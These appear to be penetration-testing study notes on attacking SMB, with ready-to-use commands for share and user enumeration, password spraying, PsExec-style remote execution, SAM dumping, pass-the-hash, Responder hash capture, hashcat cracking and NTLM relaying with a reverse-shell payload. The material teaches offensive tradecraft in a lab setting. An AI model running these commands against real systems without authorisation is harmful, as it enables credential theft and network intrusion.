
Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network.

## Enumeration

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

## Misconfigurations

#### Anonymous Authentication

#### File Share

```shell-session
smbclient -N -L //10.129.14.128
```

`-N` Null Session 
`-L` List Shares

```shell-session
smbmap -H 10.129.14.128
```

```shell-session
smbmap -H 10.129.14.128 -r notes
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories


```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call (RPC)

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
rpcclient -U'%' 10.10.110.17
```

```shell-session
enumdomusers
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).

```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```

---
## Protocol Specifics Attacks

#### Brute Forcing and Password Spray

```shell-session

crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

#### SMB

#### Remote Code Execution (RCE)

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually.

> Has windows service image inside of executable

> deploys it to the admin$ share (by default) on the remote machine

> DCE/RPC interface over SMB to access the Windows Service Control Manager API

Starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### Impacket PsExec

```shell-session
impacket-psexec -h
```

```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

#### CrackMapExec

One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time

```shell-session

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

`-x` for CMD commands
`-X` for PS commands

If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extract Hashes from SAM Database

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
#### Pass-the-Hash (PtH)

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

#### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Create a fake SMB server using the Responder default configuration, with the following command:

```shell-session
responder -I <interface name>
```

Name Resolution:
- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server.

```shell-session
sudo responder -I ens33
```

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`)

```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='
```

```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell-session

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<payload>'
```


#### RPC

Apart from enumeration, we can use RPC to make changes to the system, such as:

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.
We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

